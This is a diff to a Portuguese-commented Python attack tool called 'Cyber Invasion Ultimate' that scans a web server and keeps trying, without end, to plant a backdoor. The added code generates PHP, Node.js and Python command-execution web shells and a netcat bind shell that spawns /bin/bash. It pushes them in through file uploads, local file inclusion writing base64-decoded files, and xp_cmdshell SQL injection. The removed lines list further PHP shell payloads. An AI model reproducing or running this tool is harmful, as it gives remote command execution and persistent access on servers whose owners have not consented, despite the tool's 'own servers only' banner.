@@ -273,7 +273,7 @@ def menu_rede():
 # ==========================================
 
 class CyberInvasionUltimate:
-    """Cyber Invasion ULTIMATE com backdoor INFINITO e SEM REPETIÇÃO"""
+    """Cyber Invasion ULTIMATE com múltiplos tipos de backdoor"""
     
     def __init__(self, target, port=80):
         self.target = target
@@ -282,182 +282,412 @@ class CyberInvasionUltimate:
         self.dados = {}
         self.backdoor_instalado = False
         self.backdoor_url = None
+        self.tipo_servidor = None
         self.usuarios = []
-        self.arquivos = []
-        self.diretorios = []
         self.portas_abertas = []
         self.tentativas = 0
-        self.tentativas_feitas = []
         self.combinacoes_usadas = []
-        self.metodos_usados = []
         
     # ==========================================
-    # LISTA GIGANTE DE URLS DE UPLOAD
-    # ==========================================
-    
-    def gerar_urls_upload(self):
-        """Gera TODAS as URLs possíveis de upload"""
-        urls_base = [
-            "upload", "uploads", "enviar", "up", "fileupload", "uploadfile",
-            "subir", "uploader", "uploadify", "file", "files", "send", "receive",
-            "upload-handler", "ajax_upload", "ajax-upload", "upload_ajax", "upload-ajax",
-            "image_upload", "image-upload", "file_upload", "file-upload",
-            "upload_image", "upload-image", "upload_file", "upload-file",
-            "media_upload", "media-upload", "upload_media", "upload-media",
-            "content_upload", "content-upload", "upload_content", "upload-content"
-        ]
-        
-        extensoes = ["", ".php", ".html", ".asp", ".aspx", ".jsp", ".do"]
-        
-        urls = []
-        
-        for base in urls_base:
-            for ext in extensoes:
-                urls.append(f"/{base}{ext}")
-                urls.append(f"/admin/{base}{ext}")
-                urls.append(f"/panel/{base}{ext}")
-                urls.append(f"/dashboard/{base}{ext}")
-                urls.append(f"/wp-admin/{base}{ext}")
-                urls.append(f"/wp-content/{base}{ext}")
-                urls.append(f"/includes/{base}{ext}")
-                urls.append(f"/inc/{base}{ext}")
-                urls.append(f"/lib/{base}{ext}")
-                urls.append(f"/js/{base}{ext}")
-                urls.append(f"/css/{base}{ext}")
-                urls.append(f"/images/{base}{ext}")
-                urls.append(f"/media/{base}{ext}")
-                urls.append(f"/files/{base}{ext}")
-                urls.append(f"/downloads/{base}{ext}")
-                urls.append(f"/tmp/{base}{ext}")
-                urls.append(f"/temp/{base}{ext}")
-                urls.append(f"/cache/{base}{ext}")
-                urls.append(f"/backup/{base}{ext}")
-                urls.append(f"/backups/{base}{ext}")
-                urls.append(f"/log/{base}{ext}")
-                urls.append(f"/logs/{base}{ext}")
-                urls.append(f"/test/{base}{ext}")
-                urls.append(f"/dev/{base}{ext}")
-                urls.append(f"/stage/{base}{ext}")
-                urls.append(f"/staging/{base}{ext}")
-                urls.append(f"/beta/{base}{ext}")
-                urls.append(f"/api/{base}{ext}")
-                urls.append(f"/v1/{base}{ext}")
-                urls.append(f"/v2/{base}{ext}")
-                urls.append(f"/v3/{base}{ext}")
-                urls.append(f"/rest/{base}{ext}")
-                urls.append(f"/graphql/{base}{ext}")
-        
-        # URLs específicas
-        urls.extend([
-            "/wp-admin/async-upload.php",
-            "/wp-admin/media-upload.php",
-            "/wp-admin/upload.php",
-            "/wp-content/uploads/",
-            "/wp-json/wp/v2/media",
-            "/xmlrpc.php?rsd",
-            "/wp-admin/admin-ajax.php?action=upload",
-            "/wp-admin/admin-post.php?action=upload",
-            "/wp-admin/admin.php?page=upload",
-            "/wp-admin/options-media.php",
-            "/wp-admin/media-new.php",
-            "/wp-admin/media-upload.php?post_id=1",
-            "/wp-admin/async-upload.php?action=upload",
-            "/wp-admin/async-upload.php?post_id=1"
-        ])
-        
-        return list(set(urls))
-    
-    # ==========================================
-    # LISTA GIGANTE DE NOMES DE ARQUIVO
+    # DETECTAR TIPO DE SERVIDOR
     # ==========================================
     
-    def gerar_nomes_arquivo(self):
-        """Gera TODOS os nomes de arquivo possíveis"""
-        nomes = [
-            "shell", "backdoor", "cmd", "admin", "root", "system",
-            "exec", "php", "test", "x", "a", "b", "c", "1", "2", "3",
-            "exploit", "hack", "payload", "reverse", "bind", "connect",
-            "upload", "file", "uploader", "uploadify", "handler",
-            "ajax", "api", "rest", "graphql", "query", "sql",
-            "mysql", "postgres", "mongo", "redis", "cache",
-            "config", "conf", "settings", "setup", "install",
-            "index", "default", "main", "home", "login", "auth",
-            "user", "users", "adminer", "phpmyadmin", "myadmin",
-            "pma", "phpinfo", "info"
-        ]
+    def detectar_servidor(self):
+        """Detecta o tipo de servidor (PHP, Node.js, Python, etc)"""
+        print(f"\n{CYAN}[~] Detectando tipo de servidor...{RESET}")
         
-        extensoes = [".php", ".php5", ".php7", ".phtml", ".phar", ".inc", ".html", ".htm"]
-        
-        arquivos = []
-        for nome in nomes:
-            for ext in extensoes:
-                arquivos.append(f"{nome}{ext}")
-                arquivos.append(f"{nome}_backup{ext}")
-                arquivos.append(f"{nome}_old{ext}")
-                arquivos.append(f"{nome}_new{ext}")
-                arquivos.append(f"{nome}_v2{ext}")
-                arquivos.append(f"{nome}_v3{ext}")
-                arquivos.append(f"{nome}_test{ext}")
-                arquivos.append(f"{nome}_dev{ext}")
-                arquivos.append(f"{nome}_prod{ext}")
-                arquivos.append(f"{nome}_stage{ext}")
-                arquivos.append(f"{nome}_copy{ext}")
-                arquivos.append(f"{nome}_temp{ext}")
-                arquivos.append(f"{nome}_tmp{ext}")
-        
-        return list(set(arquivos))
+        try:
+            # Tenta acessar a página principal
+            url = f"http://{self.target}:{self.port}/"
+            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+            response = urllib.request.urlopen(req, timeout=5)
+            
+            # Verifica headers
+            headers = str(response.headers)
+            print(f"  {BLUE}[→] Headers recebidos{RESET}")
+            
+            # Detecta Node.js
+            if "node" in headers.lower() or "express" in headers.lower():
+                self.tipo_servidor = "nodejs"
+                print(f"  {GREEN}[+] Servidor Node.js detectado!{RESET}")
+                return "nodejs"
+            
+            # Detecta PHP
+            if "php" in headers.lower() or "x-powered-by" in headers.lower():
+                self.tipo_servidor = "php"
+                print(f"  {GREEN}[+] Servidor PHP detectado!{RESET}")
+                return "php"
+            
+            # Detecta Python
+            if "python" in headers.lower() or "wsgi" in headers.lower():
+                self.tipo_servidor = "python"
+                print(f"  {GREEN}[+] Servidor Python detectado!{RESET}")
+                return "python"
+            
+            # Detecta Apache
+            if "apache" in headers.lower():
+                self.tipo_servidor = "apache"
+                print(f"  {GREEN}[+] Servidor Apache detectado!{RESET}")
+                return "apache"
+            
+            # Detecta Nginx
+            if "nginx" in headers.lower():
+                self.tipo_servidor = "nginx"
+                print(f"  {GREEN}[+] Servidor Nginx detectado!{RESET}")
+                return "nginx"
+            
+            # Detecta por extensão
+            html = response.read().decode('utf-8', errors='ignore')
+            if ".php" in html or "<?php" in html:
+                self.tipo_servidor = "php"
+                print(f"  {GREEN}[+] Possível servidor PHP detectado!{RESET}")
+                return "php"
+            
+            if "node" in html.lower() or "express" in html.lower():
+                self.tipo_servidor = "nodejs"
+                print(f"  {GREEN}[+] Possível servidor Node.js detectado!{RESET}")
+                return "nodejs"
+            
+            # Default
+            self.tipo_servidor = "desconhecido"
+            print(f"  {YELLOW}[!] Tipo de servidor desconhecido{RESET}")
+            return "desconhecido"
+            
+        except Exception as e:
+            print(f"  {YELLOW}[!] Erro ao detectar servidor: {e}{RESET}")
+            self.tipo_servidor = "desconhecido"
+            return "desconhecido"
     
     # ==========================================
-    # LISTA DE PAYLOADS PHP
+    # GERAR BACKDOOR POR TIPO DE SERVIDOR
     # ==========================================
     
-    def gerar_payloads(self):
-        """Gera diferentes payloads PHP"""
-        return [
-            """<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>""",
-            """<?php if(isset($_REQUEST['cmd'])){ echo shell_exec($_REQUEST['cmd']); } ?>""",
-            """<?php @eval($_POST['cmd']); ?>""",
-            """<?php if(isset($_GET['c'])){ passthru($_GET['c']); } ?>""",
-            """<?php if(isset($_POST['c'])){ exec($_POST['c'], $r); echo implode('\\n', $r); } ?>""",
-            """<?php system($_GET['cmd']); ?>""",
-            """<?php exec($_GET['cmd']); ?>""",
-            """<?php passthru($_GET['cmd']); ?>""",
-            """<?php shell_exec($_GET['cmd']); ?>""",
-            """<?php `$_GET[cmd]`; ?>""",
-            """<?php echo shell_exec($_GET['cmd']); ?>""",
-            """<?php $cmd=$_GET['cmd'];system($cmd); ?>""",
-            """<?php @eval($_GET['cmd']); ?>""",
-            """<?php assert($_GET['cmd']); ?>""",
-            """<?php include($_GET['file']); ?>""",
-            """<?php require($_GET['file']); ?>""",
-            """<?php file_get_contents($_GET['file']); ?>""",
-        ]
+    def gerar_backdoor_nodejs(self):
+        """Gera backdoor para Node.js"""
+        return """
+const http = require('http');
+const { exec } = require('child_process');
+
+const server = http.createServer((req, res) => {
+    const url = new URL(req.url, 'http://localhost');
+    const cmd = url.searchParams.get('cmd');
+    
+    if (cmd) {
+        exec(cmd, (error, stdout, stderr) => {
+            res.writeHead(200, {'Content-Type': 'text/plain'});
+            res.end(stdout || stderr || 'OK');
+        });
+    } else {
+        res.writeHead(200, {'Content-Type': 'text/html'});
+        res.end('<h1>Backdoor Node.js</h1><p>Use ?cmd=comando</p>');
+    }
+});
+
+server.listen(8888, '0.0.0.0', () => {
+    console.log('Backdoor rodando na porta 8888');
+});
+"""
+    
+    def gerar_backdoor_php(self):
+        """Gera backdoor para PHP"""
+        return """<?php
+if(isset($_GET['cmd'])){ system($_GET['cmd']); }
+if(isset($_GET['file'])){ echo file_get_contents($_GET['file']); }
+?>"""
+    
+    def gerar_backdoor_python(self):
+        """Gera backdoor para Python"""
+        return """
+import os
+import sys
+import http.server
+import socketserver
+
+class Handler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if 'cmd' in self.path:
+            cmd = self.path.split('cmd=')[1].split('&')[0]
+            output = os.popen(cmd).read()
+            self.send_response(200)
+            self.send_header('Content-type', 'text/plain')
+            self.end_headers()
+            self.wfile.write(output.encode())
+        else:
+            super().do_GET()
+
+PORT = 8888
+with socketserver.TCPServer(("", PORT), Handler) as httpd:
+    print(f"Backdoor na porta {PORT}")
+    httpd.serve_forever()
+"""
+    
+    def gerar_backdoor_shell(self):
+        """Gera backdoor Shell Script"""
+        return """#!/bin/bash
+# Backdoor Shell
+while true; do
+    nc -lvp 8888 -e /bin/bash
+    sleep 5
+done
+"""
     
     # ==========================================
     # GERAR COMBINAÇÃO ÚNICA
     # ==========================================
     
     def gerar_combinacao_unica(self):
-        """Gera uma combinação que NUNCA foi usada antes"""
+        """Gera combinação única para tentativa"""
         
-        urls = self.gerar_urls_upload()
-        nomes = self.gerar_nomes_arquivo()
-        payloads = self.gerar_payloads()
+        # URLs de upload
+        urls = [
+            "/", "/upload", "/uploads", "/upload.php", "/uploads/",
+            "/api/upload", "/admin/upload", "/uploader", "/fileupload",
+            "/upload-file", "/upload_handler", "/upload-handler",
+            "/wp-admin/upload.php", "/wp-content/uploads/",
+            "/wp-json/wp/v2/media", "/xmlrpc.php?rsd",
+            "/admin/upload", "/panel/upload", "/dashboard/upload"
+        ]
+        
+        # Nomes de arquivo
+        nomes = [
+            "shell", "backdoor", "cmd", "admin", "root", "system",
+            "exec", "php", "test", "x", "a", "b", "c", "1", "2", "3",
+            "exploit", "hack", "payload", "reverse", "bind", "connect",
+            "upload", "file", "uploader", "ajax", "api", "rest",
+            "config", "conf", "settings", "setup", "install",
+            "index", "default", "main", "home", "login", "auth",
+            "user", "users", "adminer", "phpmyadmin", "myadmin",
+            "pma", "phpinfo", "info"
+        ]
+        
+        # Extensões
+        extensoes = [".php", ".js", ".py", ".sh", ".html", ".txt"]
+        
+        # Payloads
+        if self.tipo_servidor == "nodejs":
+            payloads = [self.gerar_backdoor_nodejs()]
+        elif self.tipo_servidor == "php":
+            payloads = [self.gerar_backdoor_php()]
+        elif self.tipo_servidor == "python":
+            payloads = [self.gerar_backdoor_python()]
+        else:
+            payloads = [
+                self.gerar_backdoor_php(),
+                self.gerar_backdoor_nodejs(),
+                self.gerar_backdoor_python(),
+                self.gerar_backdoor_shell()
+            ]
         
         random.shuffle(urls)
         random.shuffle(nomes)
+        random.shuffle(extensoes)
         random.shuffle(payloads)
         
         for url in urls:
             for nome in nomes:
-                for payload in payloads:
-                    combinacao = f"{url}|{nome}|{payload[:50]}"
-                    if combinacao not in self.combinacoes_usadas:
-                        self.combinacoes_usadas.append(combinacao)
-                        return url, nome, payload
+                for ext in extensoes:
+                    for payload in payloads:
+                        combinacao = f"{url}|{nome}{ext}|{payload[:30]}"
+                        if combinacao not in self.combinacoes_usadas:
+                            self.combinacoes_usadas.append(combinacao)
+                            return url, f"{nome}{ext}", payload
         
         self.combinacoes_usadas = []
         return self.gerar_combinacao_unica()
+    
+    # ==========================================
+    # INSTALAR BACKDOOR - INFINITO
+    # ==========================================
+    
+    def instalar_backdoor(self):
+        """Instala backdoor - TENTA INFINITAMENTE"""
+        print(f"\n{RED}╔{'═' * (LARGURA - 2)}╗{RESET}")
+        print(f"{RED}║     🔥 INSTALANDO BACKDOOR      ║{RESET}")
+        print(f"{RED}║     TENTANDO ATE CONSEGUIR!    ║{RESET}")
+        print(f"{RED}║     SERVIDOR: {self.tipo_servidor.upper()}{' ' * (15) }║{RESET}")
+        print(f"{RED}╚{'═' * (LARGURA - 2)}╝{RESET}")
+        
+        print(f"\n{CYAN}[~] Gerando combinacoes unicas...{RESET}")
+        print(f"{YELLOW}[!] Pressione Ctrl+C para parar{RESET}\n")
+        
+        while not self.backdoor_instalado:
+            self.tentativas += 1
+            
+            upload_url, nome_arquivo, payload = self.gerar_combinacao_unica()
+            
+            if self.tentativas % 10 == 0:
+                print(f"  {YELLOW}[!] Tentativa {self.tentativas}: Testando...{RESET}")
+                print(f"  {GRAY}    URL: {upload_url}{RESET}")
+                print(f"  {GRAY}    Arquivo: {nome_arquivo}{RESET}")
+                print(f"  {GRAY}    Tipo: {nome_arquivo.split('.')[-1]}{RESET}")
+            
+            # ==========================================
+            # MÉTODO 1: UPLOAD VIA FORMULARIO
+            # ==========================================
+            try:
+                shell_code = payload.encode('utf-8')
+                
+                boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
+                body = (f"--{boundary}\r\n"
+                       f"Content-Disposition: form-data; name=\"file\"; filename=\"{nome_arquivo}\"\r\n"
+                       f"Content-Type: application/x-www-form-urlencoded\r\n\r\n").encode()
+                body += shell_code
+                body += f"\r\n--{boundary}--\r\n".encode()
+                
+                headers = {
+                    "User-Agent": "Mozilla/5.0",
+                    "Content-Type": f"multipart/form-data; boundary={boundary}"
+                }
+                
+                full_url = f"http://{self.target}:{self.port}{upload_url}"
+                req = urllib.request.Request(full_url, data=body, headers=headers)
+                response = urllib.request.urlopen(req, timeout=5)
+                
+                if response.getcode() in [200, 201, 302]:
+                    print(f"  {GREEN}[+] Tentativa {self.tentativas}: Upload enviado ({nome_arquivo}){RESET}")
+                    if self._testar_backdoor():
+                        return True
+            except:
+                pass
+            
+            # ==========================================
+            # MÉTODO 2: UPLOAD VIA POST
+            # ==========================================
+            try:
+                data = payload.encode()
+                full_url = f"http://{self.target}:{self.port}{upload_url}"
+                req = urllib.request.Request(
+                    full_url,
+                    data=data,
+                    headers={
+                        "User-Agent": "Mozilla/5.0",
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    }
+                )
+                response = urllib.request.urlopen(req, timeout=3)
+                if self._testar_backdoor():
+                    return True
+            except:
+                pass
+            
+            # ==========================================
+            # MÉTODO 3: VIA LFI
+            # ==========================================
+            if self.vulnerabilidades.get('lfi') and self.tentativas % 3 == 0:
+                try:
+                    encoded_payload = base64.b64encode(payload.encode()).decode()
+                    comando = f"echo '{encoded_payload}' | base64 -d > /var/www/html/{nome_arquivo}"
+                    
+                    lfi_url = f"http://{self.target}:{self.port}/page.php?file=../../../../../../proc/self/environ&cmd={comando}"
+                    req = urllib.request.Request(lfi_url, headers={"User-Agent": "Mozilla/5.0"})
+                    response = urllib.request.urlopen(req, timeout=3)
+                    
+                    if self._testar_backdoor():
+                        return True
+                except:
+                    pass
+            
+            # ==========================================
+            # MÉTODO 4: VIA COMANDO DIRETO
+            # ==========================================
+            if self.tentativas % 7 == 0:
+                try:
+                    # Tenta executar comando remotamente
+                    comando = f"wget -O /tmp/{nome_arquivo} http://{self.target}:{self.port}/{nome_arquivo} 2>/dev/null"
+                    self._executar_comando_remoto(comando)
+                    
+                    if self._testar_backdoor():
+                        return True
+                except:
+                    pass
+            
+            time.sleep(0.05)
+        
+        return False
+    
+    # ==========================================
+    # TESTA BACKDOOR
+    # ==========================================
+    
+    def _testar_backdoor(self):
+        """Testa se o backdoor foi instalado"""
+        
+        # URLs para testar
+        urls = [
+            f"http://{self.target}:{self.port}/uploads/shell.php",
+            f"http://{self.target}:{self.port}/shell.php",
+            f"http://{self.target}:{self.port}/backdoor.php",
+            f"http://{self.target}:{self.port}/cmd.php",
+            f"http://{self.target}:{self.port}/shell.js",
+            f"http://{self.target}:{self.port}/backdoor.js",
+            f"http://{self.target}:{self.port}/shell.py",
+            f"http://{self.target}:{self.port}/backdoor.py",
+            f"http://{self.target}:{self.port}/shell.sh",
+            f"http://{self.target}:{self.port}/backdoor.sh",
+            f"http://{self.target}:{self.port}/uploads/shell.js",
+            f"http://{self.target}:{self.port}/uploads/shell.py",
+            f"http://{self.target}:{self.port}/uploads/shell.sh",
+            f"http://{self.target}:{self.port}/x.php",
+            f"http://{self.target}:{self.port}/1.php",
+            f"http://{self.target}:{self.port}/a.php",
+            f"http://{self.target}:{self.port}/test.php",
+            f"http://{self.target}:{self.port}/shell2.php"
+        ]
+        
+        for url in urls:
+            try:
+                # Testa com parâmetro cmd
+                req = urllib.request.Request(
+                    f"{url}?cmd=echo%20'OK'",
+                    headers={"User-Agent": "Mozilla/5.0"}
+                )
+                response = urllib.request.urlopen(req, timeout=2)
+                
+                if response.getcode() == 200:
+                    html = response.read().decode('utf-8', errors='ignore')
+                    if "OK" in html or "cmd" in html or "system" in html or "exec" in html:
+                        self.backdoor_url = url
+                        self.backdoor_instalado = True
+                        print(f"\n{GREEN}╔{'═' * (LARGURA - 2)}╗{RESET}")
+                        print(f"{GREEN}║     ✅ BACKDOOR INSTALADO!      ║{RESET}")
+                        print(f"{GREEN}║     📍 {url[:40]}║{RESET}")
+                        print(f"{GREEN}║     📊 Tentativas: {self.tentativas}║{RESET}")
+                        print(f"{GREEN}║     🖥️  Tipo: {url.split('.')[-1].upper()}{' ' * (10) }║{RESET}")
+                        print(f"{GREEN}╚{'═' * (LARGURA - 2)}╝{RESET}")
+                        return True
+            except:
+                continue
+        
+        return False
+    
+    # ==========================================
+    # EXECUTAR COMANDO REMOTO
+    # ==========================================
+    
+    def _executar_comando_remoto(self, comando):
+        """Tenta executar comando remotamente via vulnerabilidade"""
+        try:
+            # Tenta via LFI
+            if self.vulnerabilidades.get('lfi'):
+                url = f"http://{self.target}:{self.port}/page.php?file=../../../../../../proc/self/environ&cmd={comando}"
+                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                response = urllib.request.urlopen(req, timeout=3)
+                return True
+        except:
+            pass
+        
+        # Tenta via SQL Injection
+        if self.vulnerabilidades.get('sql_injection'):
+            try:
+                payload = f"'; EXEC xp_cmdshell('{comando}'); --"
+                url = f"http://{self.target}:{self.port}/login.php?user=admin&pass={payload}"
+                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                response = urllib.request.urlopen(req, timeout=3)
+                return True
+            except:
+                pass
+        
+        return False
     
     # ==========================================
     # SCAN DE PORTAS
@@ -630,7 +860,12 @@ class CyberInvasionUltimate:
         """Testa upload"""
         print(f"\n{CYAN}[~] Testando Upload...{RESET}")
         
-        upload_urls = self.gerar_urls_upload()[:50]
+        upload_urls = [
+            "/upload.php", "/uploads/", "/enviar.php", "/up.php",
+            "/upload/", "/fileupload.php", "/uploader", "/upload-handler",
+            "/wp-admin/upload.php", "/wp-content/uploads/",
+            "/api/upload", "/admin/upload", "/panel/upload"
+        ]
         
         encontrados = []
         
@@ -677,7 +912,10 @@ class CyberInvasionUltimate:
             f"http://{self.target}:{self.port}/shell.php",
             f"http://{self.target}:{self.port}/backdoor.php",
             f"http://{self.target}:{self.port}/cmd.php",
-            f"http://{self.target}:{self.port}/admin.php"
+            f"http://{self.target}:{self.port}/admin.php",
+            f"http://{self.target}:{self.port}/shell.js",
+            f"http://{self.target}:{self.port}/backdoor.js",
+            f"http://{self.target}:{self.port}/shell.py"
         ]
         
         for url in urls:
@@ -718,180 +956,22 @@ class CyberInvasionUltimate:
             print(f"{RED}[-] Servidor offline!{RESET}")
             return False
         
+        # Detecta tipo de servidor
+        self.detectar_servidor()
+        
+        # Scan de portas
         self.scan_portas()
+        
+        # Testa vulnerabilidades
         self.testar_sql_injection()
         self.testar_xss()
         self.testar_lfi()
         self.testar_upload()
+        
+        # Verifica backdoor
         self.verificar_backdoor()
         
         return True
-    
-    # ==========================================
-    # INSTALAR BACKDOOR - INFINITO E VARIADO
-    # ==========================================
-    
-    def instalar_backdoor(self):
-        """Instala backdoor - TENTA INFINITAMENTE COM VARIAÇÕES"""
-        print(f"\n{RED}╔{'═' * (LARGURA - 2)}╗{RESET}")
-        print(f"{RED}║     🔥 INSTALANDO BACKDOOR      ║{RESET}")
-        print(f"{RED}║     TENTANDO ATE CONSEGUIR!    ║{RESET}")
-        print(f"{RED}║     SEM REPETIR COMBINACOES!   ║{RESET}")
-        print(f"{RED}╚{'═' * (LARGURA - 2)}╝{RESET}")
-        
-        print(f"\n{CYAN}[~] Gerando combinacoes unicas...{RESET}")
-        print(f"{YELLOW}[!] Pressione Ctrl+C para parar{RESET}\n")
-        
-        while not self.backdoor_instalado:
-            self.tentativas += 1
-            
-            upload_url, nome_arquivo, payload = self.gerar_combinacao_unica()
-            
-            if self.tentativas % 10 == 0:
-                print(f"  {YELLOW}[!] Tentativa {self.tentativas}: Testando novas combinacoes...{RESET}")
-                print(f"  {GRAY}    URL: {upload_url}{RESET}")
-                print(f"  {GRAY}    Arquivo: {nome_arquivo}{RESET}")
-            
-            # MÉTODO 1: UPLOAD VIA FORMULARIO
-            try:
-                shell_code = payload.encode('utf-8')
-                
-                boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
-                body = (f"--{boundary}\r\n"
-                       f"Content-Disposition: form-data; name=\"file\"; filename=\"{nome_arquivo}\"\r\n"
-                       f"Content-Type: application/x-php\r\n\r\n").encode()
-                body += shell_code
-                body += f"\r\n--{boundary}--\r\n".encode()
-                
-                headers = {
-                    "User-Agent": "Mozilla/5.0",
-                    "Content-Type": f"multipart/form-data; boundary={boundary}"
-                }
-                
-                full_url = f"http://{self.target}:{self.port}{upload_url}"
-                req = urllib.request.Request(full_url, data=body, headers=headers)
-                response = urllib.request.urlopen(req, timeout=5)
-                
-                if response.getcode() in [200, 201, 302]:
-                    print(f"  {GREEN}[+] Tentativa {self.tentativas}: Upload enviado para {upload_url} ({nome_arquivo}){RESET}")
-                    if self._testar_backdoor():
-                        return True
-            except:
-                pass
-            
-            # MÉTODO 2: UPLOAD VIA POST
-            try:
-                data = payload.encode()
-                full_url = f"http://{self.target}:{self.port}{upload_url}"
-                req = urllib.request.Request(
-                    full_url,
-                    data=data,
-                    headers={
-                        "User-Agent": "Mozilla/5.0",
-                        "Content-Type": "application/x-www-form-urlencoded"
-                    }
-                )
-                response = urllib.request.urlopen(req, timeout=3)
-                if self._testar_backdoor():
-                    return True
-            except:
-                pass
-            
-            # MÉTODO 3: UPLOAD VIA GET
-            try:
-                full_url = f"http://{self.target}:{self.port}{upload_url}?file={nome_arquivo}&code={payload}"
-                req = urllib.request.Request(full_url, headers={"User-Agent": "Mozilla/5.0"})
-                response = urllib.request.urlopen(req, timeout=3)
-                if self._testar_backdoor():
-                    return True
-            except:
-                pass
-            
-            # MÉTODO 4: VIA LFI
-            if self.vulnerabilidades.get('lfi') and self.tentativas % 3 == 0:
-                try:
-                    encoded_payload = base64.b64encode(payload.encode()).decode()
-                    comando = f"echo '{encoded_payload}' | base64 -d > /var/www/html/{nome_arquivo}"
-                    lfi_url = f"http://{self.target}:{self.port}/page.php?file=../../../../../../proc/self/environ&cmd={comando}"
-                    req = urllib.request.Request(lfi_url, headers={"User-Agent": "Mozilla/5.0"})
-                    response = urllib.request.urlopen(req, timeout=3)
-                    if self._testar_backdoor():
-                        return True
-                except:
-                    pass
-            
-            # MÉTODO 5: VIA COMANDO
-            if self.backdoor_instalado and self.tentativas % 5 == 0:
-                try:
-                    self.executar_comando(f"echo '{payload}' > /var/www/html/{nome_arquivo}")
-                    if self._testar_backdoor():
-                        return True
-                except:
-                    pass
-            
-            # MÉTODO 6: VIA FILE_PUT_CONTENTS
-            if self.tentativas % 7 == 0:
-                try:
-                    encoded_payload = base64.b64encode(payload.encode()).decode()
-                    data = f"upload=1&name={nome_arquivo}&data={encoded_payload}".encode()
-                    full_url = f"http://{self.target}:{self.port}{upload_url}"
-                    req = urllib.request.Request(
-                        full_url,
-                        data=data,
-                        headers={
-                            "User-Agent": "Mozilla/5.0",
-                            "Content-Type": "application/x-www-form-urlencoded"
-                        }
-                    )
-                    response = urllib.request.urlopen(req, timeout=3)
-                    if self._testar_backdoor():
-                        return True
-                except:
-                    pass
-            
-            time.sleep(0.05)
-        
-        return False
-    
-    # ==========================================
-    # TESTA BACKDOOR
-    # ==========================================
-    
-    def _testar_backdoor(self):
-        """Testa se o backdoor foi instalado em QUALQUER lugar"""
-        locais = [
-            "/uploads/", "/upload/", "/files/", "/media/", "/images/",
-            "/wp-content/uploads/", "/wp-content/", "/wp-admin/",
-            "/", "/admin/", "/panel/", "/dashboard/", "/api/"
-        ]
-        
-        nomes = self.gerar_nomes_arquivo()[:20]
-        
-        for local in locais:
-            for nome in nomes:
-                url = f"http://{self.target}:{self.port}{local}{nome}"
-                try:
-                    req = urllib.request.Request(
-                        f"{url}?cmd=echo%20'OK'",
-                        headers={"User-Agent": "Mozilla/5.0"}
-                    )
-                    response = urllib.request.urlopen(req, timeout=2)
-                    
-                    if response.getcode() == 200:
-                        html = response.read().decode('utf-8', errors='ignore')
-                        if "OK" in html or "cmd" in html or "system" in html:
-                            self.backdoor_url = url
-                            self.backdoor_instalado = True
-                            print(f"\n{GREEN}╔{'═' * (LARGURA - 2)}╗{RESET}")
-                            print(f"{GREEN}║     ✅ BACKDOOR INSTALADO!      ║{RESET}")
-                            print(f"{GREEN}║     📍 {url[:40]}║{RESET}")
-                            print(f"{GREEN}║     📊 Tentativas: {self.tentativas}║{RESET}")
-                            print(f"{GREEN}╚{'═' * (LARGURA - 2)}╝{RESET}")
-                            return True
-                except:
-                    continue
-        
-        return False
     
     # ==========================================
     # EXECUTAR COMANDO
@@ -1024,6 +1104,7 @@ class CyberInvasionUltimate:
         print(f"{PURPLE}║     📊 RESULTADOS ENCONTRADOS  ║{RESET}")
         print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
         print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (21 - len(str(self.port))) }║{RESET}")
+        print(f"{PURPLE}║ Tipo: {self.tipo_servidor.upper()}{' ' * (20) }║{RESET}")
         print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
         
         if self.portas_abertas:
@@ -1055,9 +1136,11 @@ class CyberInvasionUltimate:
             print(f"\n{GREEN}┌─ BACKDOOR INSTALADO{RESET}")
             print(f"  {GREEN}[+] URL: {self.backdoor_url}{RESET}")
             print(f"  {GREEN}[+] Tentativas: {self.tentativas}{RESET}")
+            print(f"  {GREEN}[+] Tipo: {self.backdoor_url.split('.')[-1].upper()}{RESET}")
         else:
             print(f"\n{YELLOW}┌─ BACKDOOR{RESET}")
             print(f"  {YELLOW}[!] Nao instalado - Use opcao [1]{RESET}")
+            print(f"  {YELLOW}[!] Tipo de servidor: {self.tipo_servidor.upper()}{RESET}")
 
 
 # ==========================================
@@ -1073,8 +1156,8 @@ def cyber_invasion():
     print("║    🚀 CYBER INVASION ULTIMATE         ║")
     print("╠══════════════════════════════════════════╣")
     print("║  SCAN COMPLETO EM TODOS OS ASPECTOS    ║")
-    print("║  BACKDOOR TENTA ATE CONSEGUIR!        ║")
-    print("║  SEM REPETIR COMBINACOES!             ║")
+    print("║  DETECTA TIPO DE SERVIDOR             ║")
+    print("║  BACKDOOR MULTIPLO (PHP/JS/PY/SH)     ║")
     print("║  APENAS EM SERVIDORES PROPIOS!        ║")
     print("╚══════════════════════════════════════════╝")
     
@@ -1149,8 +1232,10 @@ def cyber_invasion():
             print(f"{GREEN}║ ✅ Backdoor: INSTALADO         ║{RESET}")
             print(f"{GREEN}║ 📍 {invasor.backdoor_url[:35]}{' ' * (10) }║{RESET}")
             print(f"{GREEN}║ 📊 Tentativas: {invasor.tentativas}{' ' * (15) }║{RESET}")
+            print(f"{GREEN}║ 🖥️  Tipo: {invasor.backdoor_url.split('.')[-1].upper()}{' ' * (10) }║{RESET}")
         else:
             print(f"{RED}║ ❌ Backdoor: NAO INSTALADO     ║{RESET}")
+            print(f"{RED}║ 🖥️  Servidor: {invasor.tipo_servidor.upper()}{' ' * (15) }║{RESET}")
         
         print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
         print(f"{PURPLE}║ [1] Instalar Backdoor (INFINITO)║{RESET}")
@@ -1167,7 +1252,7 @@ def cyber_invasion():
         
         if sub_opcao == "1":
             print(f"\n{YELLOW}[!] Iniciando instalacao INFINITA...{RESET}")
-            print(f"{YELLOW}[!] Cada tentativa usa combinacoes UNICAS{RESET}")
+            print(f"{YELLOW}[!] Tipo de servidor: {invasor.tipo_servidor.upper()}{RESET}")
             print(f"{YELLOW}[!] Pressione Ctrl+C para parar{RESET}")
             invasor.instalar_backdoor()
